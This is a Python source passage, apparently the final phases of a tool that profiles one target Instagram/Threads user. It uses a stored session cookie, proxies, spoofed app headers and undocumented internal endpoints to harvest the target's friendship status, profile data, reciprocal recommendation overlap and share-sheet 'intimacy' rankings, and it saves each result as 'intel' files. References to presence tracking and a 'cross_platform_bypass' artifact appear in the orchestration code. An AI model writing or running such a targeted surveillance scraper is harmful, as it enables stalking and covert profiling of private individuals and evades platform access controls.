            out['one_way_only_count'] += 1
        out['reciprocal_results'].append(result)
        time.sleep(0.5)                        

    out['two_way_overlap_pct'] = round(
        out['two_way_overlap_count'] * 100 /
        max(1, out['cluster_top_tested']), 1)
    return out


def run_phase35(target_username, target_pk, cookies, proxies=None,
                  max_check=30, current_candidates=None):
    print(f'[*] Phase 35: RECIPROCAL RECOMMENDATION OVERLAP pk={target_pk}')
    intel = harvest_reciprocal_chaining(
        target_pk, target_username, cookies, proxies, max_check,
        current_candidates=current_candidates)
    if intel.get('error'):
        print(f'  [!] {intel["error"]}')
        path = _save_json(target_username, 'reciprocal_phase35.json', intel)
        print(f'  -> {path}')
        return intel

    print(f'  cluster_top_tested = {intel["cluster_top_tested"]}')
    print(f'  TWO-WAY OVERLAP    = {intel["two_way_overlap_count"]} '
           f'({intel["two_way_overlap_pct"]}%)')
    print(f'  ONE-WAY ONLY       = {intel["one_way_only_count"]}')
    print('  [note] Recommendation overlap is not proof of follow direction.')
    print()
    print('  --- TWO-WAY RECOMMENDATION OVERLAP ---')
    mutuals = [r for r in intel['reciprocal_results']
               if r.get('association_class') ==
               'BIDIRECTIONAL_RECOMMENDATION_OVERLAP']
    mutuals.sort(key=lambda x: x.get('target_rank_in_their_chain') or 999)
    for r in mutuals[:20]:
        print(f'    @{r["cluster_username"]:<25} target rank={r.get("target_rank_in_their_chain")}/'
               f'{r.get("their_chain_size")} fn={r.get("target_full_name_in_chain")!r}')

    asym = [r for r in intel['reciprocal_results']
            if r.get('association_class') == 'ONE_WAY_RECOMMENDATION_ONLY']
    if asym:
        print()
        print('  --- ONE-WAY RECOMMENDATION ONLY ---')
        for r in asym[:10]:
            print(f'    @{r["cluster_username"]:<25} target not observed in reverse suggestions')

    path = _save_json(target_username, 'reciprocal_phase35.json', intel)
    print(f'\n  -> {path}')
    return intel


                                                                               
                                                          
                                                                               
 
                                                                            
                                                        
 
                                                                             
                                                                    
                                          
                                                                         
                                                        
 
                                                                           
                                            
                                                                   
                                    
                                        
 
                                                                   

def harvest_threads_native(target_pk, target_username, cookies, proxies=None):
    th_h = _headers(cookies)
    th_h['x-ig-app-id'] = '238260118697367'                            
    th_h['referer'] = 'https://www.threads.net/'
    th_h['user-agent'] = (
        'Barcelona 256.0.0.30.110 Android (33/13; 420dpi; 1080x2280; '
        'samsung; SM-G998B; o1s; exynos2100; en_US)')

    out = {'target_pk': str(target_pk), 'target_username': target_username}
    endpoints = [
        ('threads_friendship_show',
         f'https://www.threads.net/api/v1/friendships/show/{target_pk}/'),
        ('threads_user_info_by_username',
         f'https://www.threads.net/api/v1/users/{target_username}/usernameinfo/'),
        ('threads_user_info_by_id',
         f'https://www.threads.net/api/v1/users/{target_pk}/info/'),
        ('threads_user_extended',
         f'https://www.threads.net/api/v1/text_post_app/users/{target_pk}/'
         'profile/?username=' + target_username),
                                                           
        ('threads_search_user',
         f'https://www.threads.net/api/v1/text_status/users_search/'
         f'?q={target_username}'),
    ]

    for label, url in endpoints:
        try:
            r = requests.get(url, headers=th_h, cookies=cookies,
                              timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.4)
            continue
        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:30] if isinstance(d, dict) else None
                entry['data'] = d
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:300]
        out[label] = entry
        time.sleep(0.5)
    return out


def run_phase36(target_username, target_pk, cookies, proxies=None):
    print(f'[*] Phase 36: THREADS NATIVE HARVEST pk={target_pk}')
    intel = harvest_threads_native(target_pk, target_username, cookies, proxies)

                
    fs = (intel.get('threads_friendship_show') or {}).get('data') or {}
    if fs:
        print(f'  threads friendship_status:')
        for k in ('following', 'followed_by', 'blocking', 'is_bestie',
                   'incoming_request', 'outgoing_request',
                   'text_post_app_pre_following', 'is_eligible_to_subscribe',
                   'is_supervised_by_viewer', 'is_guardian_of_viewer',
                   'is_muting_notes', 'is_muting_media_notes',
                   'is_muting_media_reposts'):
            if k in fs:
                print(f'    {k:<35} = {fs[k]}')

    ui = (intel.get('threads_user_info_by_username') or {}).get('data') or {}
    if ui:
        u = ui.get('user') or {}
        print(f'\n  threads user info ({len(u)} fields):')
        for k in ('pk', 'username', 'full_name', 'biography', 'is_private',
                   'follower_count', 'following_count', 'media_count',
                   'is_text_post_app_only_user', 'has_onboarded_to_text_post_app',
                   'show_text_post_app_badge', 'text_post_app_joiner_number',
                   'text_post_app_signup_subtype', 'text_post_app_link_type'):
            if k in u and u[k] not in (None, '', False, 0):
                print(f'    {k:<40} = {u[k]}')

    path = _save_json(target_username, 'threads_phase36.json', intel)
    print(f'\n  -> {path}')
    return intel


                                                                               
                                                                       
                                                                               
 
                                                                                    
                                                                            
                                                                          
                                                                
 
                   
                                                                         
                                       
 
                                                                            
                                                        
 
                                                                          
                                                          

BANYAN_VIEWS = (
    'faceswap_share_sheet',
    'direct_v2_inbox_quick_share',
    'story_share_sheet',
    'reel_share_sheet',
    'post_share_sheet',
    'clips_share_sheet',
    'external_share_sheet',
    'direct_user_search',
    'direct_compose_recipients',
    'send_to_share_sheet',
)


def harvest_banyan_share_intimacy(target_pk, cookies, proxies=None):
    """Banyan endpoint'i 10 farkli share view ile cagir, target_pk her listede
    var mi kontrol et. Mantik: target birden cok view'de gorunuyorsa viewer
    icin viewer-bound bir onerilme sinyali oldugunu kaydet."""
    import urllib.parse as _u
    h = _headers(cookies)
                            
    h['x-ig-client-endpoint'] = 'MainFeedFragment:feed_timeline'
    h['x-bloks-version-id'] = (
        '8f3db7be00850e43bd95dd80175b2eb634668779c850b82e3a1202f925380c8e')
    h['x-fb-friendly-name'] = 'IgApi: banyan/banyan/'

    target_pk_s = str(target_pk)
    viewer_pk_s = str(cookies.get('ds_user_id') or '')
    out = {
        'target_pk': target_pk_s,
        'viewer_pk': viewer_pk_s,
        'scope': {
            'viewer_pk': viewer_pk_s,
            'target_pk': target_pk_s,
            'captured_at': time.time(),
        },
        'views_tested': len(BANYAN_VIEWS),
        'views_with_data': 0,
        'target_in_views': [],
        'target_view_count': 0,
        'all_ranked_users': {},                                               
        'total_unique_ranked': 0,
    }

    for view in BANYAN_VIEWS:
        views_param = _u.quote(json.dumps([view]))
        ibc_params = _u.quote(json.dumps({'size': 100}))
        url = (f'https://i.instagram.com/api/v1/banyan/banyan/'
                f'?is_private_share=false&views={views_param}'
                f'&IBCShareSheetParams={ibc_params}&is_real_time=false')
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                              timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            continue

        if r.status_code != 200:
            continue
        try:
            d = r.json()
        except json.JSONDecodeError:
            continue

                                 
                                                                                      
        view_blocks = d.get('users') or []
        ranked_users = []
        for vb in view_blocks:
            if vb.get('view_name') != view:
                continue
            ranked_users = vb.get('users') or []
            break
        if not ranked_users:
            continue

        out['views_with_data'] += 1
        target_rank_in_view = None
        for rank, u in enumerate(ranked_users):
            pk = str(u.get('pk') or '')
            if not pk:
                continue
                          
            if pk == target_pk_s:
                target_rank_in_view = rank
                out['target_in_views'].append({
                    'view': view,
                    'rank': rank,
                    'total_in_view': len(ranked_users),
                    'rank_pct': round(rank / max(1, len(ranked_users)), 3),
                    'full_name': u.get('full_name'),
                    'is_private': u.get('is_private'),
                    'is_verified': u.get('is_verified'),
                })
                                                             
            entry = out['all_ranked_users'].setdefault(pk, {
                'pk': pk, 'username': u.get('username'),
                'full_name': u.get('full_name'),
                'is_private': u.get('is_private'),
                'is_verified': u.get('is_verified'),
                'views': [],
                'best_rank': 999,
            })
            entry['views'].append({'view': view, 'rank': rank})
            if rank < entry['best_rank']:
                entry['best_rank'] = rank
        time.sleep(0.5)

    out['target_view_count'] = len(out['target_in_views'])
    out['total_unique_ranked'] = len(out['all_ranked_users'])
    return out


def run_phase37(target_username, target_pk, cookies, proxies=None):
    print(f'[*] Phase 37: BANYAN SHARE INTIMACY pk={target_pk}')
    intel = harvest_banyan_share_intimacy(target_pk, cookies, proxies)

    print(f'  views tested:       {intel["views_tested"]}')
    print(f'  views with data:    {intel["views_with_data"]}')
    print(f'  total unique users: {intel["total_unique_ranked"]} '
           f'(viewer\'in share-sheet havuzu)')
    print(f'  target in views:    {intel["target_view_count"]}')

    if intel['target_view_count'] > 0:
        print()
        print(f'  TARGET BANYAN-RANKED ({intel["target_view_count"]} '
               f'view\'de gorunuyor) — viewer-bound suggestion signal')
        for entry in intel['target_in_views']:
            print(f'    [{entry["view"]:<32}] rank {entry["rank"]}/'
                   f'{entry["total_in_view"]} ({entry["rank_pct"]:.1%})')
        print()
        print('  Bu, viewer-target onerilme baglamidir; takip, DM veya yakinlik '
              'kaniti degildir.')
    elif intel['views_with_data'] == 0:
        print()
        print('  [-] viewer\'in IG share gecmisi yok (banyan ranking havuzu '
               'bos). Viewer hesabi pasif.')

    viewer_is_target = bool(
        intel.get('viewer_pk') and
        str(intel.get('viewer_pk')) == str(target_pk))
    if intel['total_unique_ranked'] and viewer_is_target:
        print(f'\n  Top 10 viewer share-intimacy ranking '
               f'(target degil olanlar):')
        ranked_list = sorted(intel['all_ranked_users'].values(),
                              key=lambda x: x['best_rank'])
        non_target = [u for u in ranked_list if u['pk'] != str(target_pk)]
        for u in non_target[:10]:
            views_str = ','.join(v['view'][:8] for v in u['views'][:3])
            print(f'    rank={u["best_rank"]} @{u.get("username","?"):<25} '
                   f'fn={u.get("full_name","?")!r} views={views_str}')

    if not viewer_is_target:
                                                                           
                                                                           
                                                                             
                                                                      
        intel['all_ranked_users'] = {}
        intel['ranked_users_redacted'] = True
        intel['scope_note'] = (
            'Non-target viewer rankings were discarded; target_in_views is '
            'viewer-to-target context only.')

    path = _save_json(target_username, 'banyan_phase37.json', intel)
    print(f'\n  -> {path}')
    return intel


class CachedTargetScopeConflict(RuntimeError):
    """Local artifacts explicitly identify more than one target account."""


def _resolve_target_pk(username, cookies, proxies=None):
    """Resolve a cached target ID by consensus, then use online discovery.

    A conflict is terminal: online collection must never proceed under an ID
    selected merely because its artifact happened to be read first.
    """
    target_dir = os.path.join(ARTIFACT_ROOT, username)
    cached_specs = (
        ('critical_intel.json',
         (('pk',), ('target_pk',), ('identity', 'pk'), ('intel', 'pk'))),
        (os.path.join('relationships', 'relationships_ranked.json'),
         (('target_pk',),)),
        ('presence_intel.json', (('pk',), ('target_pk',))),
        ('target_internal_phase33.json', (('pk',), ('target_pk',))),
        ('cluster_union.json', (('pk',), ('target_pk',))),
        ('discover_chaining_phase32.json', (('pk',), ('target_pk',))),
        ('chaining_cluster.json', (('pk',), ('target_pk',))),
        ('archeology_phase29.json', (('pk',), ('target_pk',))),
        ('tagged_feed.json', (('pk',), ('target_pk',))),
        ('tag_search_cluster.json', (('pk',), ('target_pk',))),
        ('news_inbox_phase31.json', (('pk',), ('target_pk',))),
        ('phase34_followgraph.json', (('pk',), ('target_pk',))),
        ('cross_platform_bypass.json', (('target_pk',),)),
        ('reciprocal_phase35.json', (('pk',), ('target_pk',))),
        ('banyan_phase37.json', (('pk',), ('target_pk',))),
    )
    ids_to_sources = {}
    for relative_path, field_paths in cached_specs:
        intel_path = os.path.join(target_dir, relative_path)
        if not os.path.exists(intel_path):
            continue
        try:
            with open(intel_path, encoding='utf-8') as f:
                payload = json.load(f)
        except (OSError, json.JSONDecodeError):
            continue
        if not isinstance(payload, dict):
            continue
        for field_path in field_paths:
            value = payload
            for part in field_path:
                value = (value.get(part)
                         if isinstance(value, dict) else None)
            if value is None or str(value).strip() == '':
                continue
            value_s = str(value).strip()
            source = f'{relative_path}:{".".join(field_path)}'
            if not value_s.isdigit():
                raise CachedTargetScopeConflict(
                    f'target_scope_invalid: {source} is not numeric')
            sources = ids_to_sources.setdefault(value_s, [])
            if source not in sources:
                sources.append(source)

    if len(ids_to_sources) > 1:
        detail = '; '.join(
            f'{pk}={",".join(sources)}'
            for pk, sources in sorted(ids_to_sources.items()))
        raise CachedTargetScopeConflict(
            f'target_scope_conflict: {username}: {detail}')
    if ids_to_sources:
        return next(iter(ids_to_sources))

    pk, _ = discover_pk(username, cookies, proxies)
    return str(pk) if pk else None


def main():
    argv = sys.argv[1:]
    if not argv or argv[0].startswith('-'):
        print(__doc__)
        sys.exit(1)
    username = argv[0]
    flags = argv[1:]
    if (not re.fullmatch(r'[A-Za-z0-9._]{1,30}', username)
            or username in ('.', '..')):
        print('[!] gecersiz username: [A-Za-z0-9._]{1,30} olmali')
        sys.exit(2)

    only = []
    for ph in ('presence', 'dsa', 'inflate', 'archeology', 'tagged',
                'news', 'chain', 'internal', 'followgraph', 'reciprocal',
                'banyan'):
        if f'--{ph}-only' in flags:
            only.append(ph)
    if not only:
        only = ['presence', 'dsa', 'inflate', 'archeology', 'tagged',
                 'news', 'chain', 'internal', 'followgraph', 'reciprocal',
                 'banyan']

    def _arg(name, default):
        if name in flags:
            i = flags.index(name)
            if i + 1 < len(flags):
                try:
                    return int(flags[i + 1])
                except ValueError:
                    return default
        return default

    max_accounts = _arg('--max-accounts', 20)
    max_media = _arg('--max-media', 12)
    mqtt_seconds = _arg('--mqtt-seconds', 15)
    chain_multi = _arg('--chain-multi', 1)                                         

    cookies = load_env_cookies()
    if not cookies:
        print('[!] ../.env IG_SESSIONID + IG_DS_USER_ID gerekli')
        sys.exit(1)

    try:
        target_pk = _resolve_target_pk(username, cookies)
    except CachedTargetScopeConflict as exc:
        print(f'[!] {exc}')
        print('[!] collection stopped; remove or regenerate conflicting artifacts')
        sys.exit(3)
    if not target_pk:
        print(f'[!] {username} için pk bulunamadı (önce ana poc.py\'yi koş)')
        sys.exit(1)

    print(f'[*] target = {username} (pk={target_pk})')
    print(f'[*] phases = {only}')
    print()

                                                                           
                                                                           
    phase28_result = None
    phase32_result = None

    if 'presence' in only:
        run_phase26(username, target_pk, cookies, mqtt_seconds=mqtt_seconds)
        print()
    if 'dsa' in only:
        run_phase27(username, target_pk, cookies)
        print()
    if 'inflate' in only:
        phase28_result = run_phase28(username, target_pk, cookies)
        print()
    if 'archeology' in only:
        run_phase29(username, target_pk, cookies,
                     max_accounts=max_accounts, max_media=max_media)
        print()
    if 'tagged' in only:
        run_phase30(username, target_pk, cookies)
        print()
    if 'news' in only:
        run_phase31(username, target_pk, cookies)
        print()
    if 'chain' in only:
        phase32_result = run_phase32(
            username, target_pk, cookies, multi_run=chain_multi)
        print()
    if 'internal' in only:
        run_phase33(username, target_pk, cookies)
        print()
    if 'followgraph' in only:
        run_phase34(username, target_pk, cookies)
        print()
    if 'reciprocal' in only:
        current_reciprocal_candidates = _build_current_reciprocal_candidates(
            target_pk, phase28_result, phase32_result)
        run_phase35(
            username, target_pk, cookies, max_check=max_accounts or 30,
            current_candidates=current_reciprocal_candidates)
        print()
    if 'banyan' in only:
        run_phase37(username, target_pk, cookies)
        print()


if __name__ == '__main__':
    main()
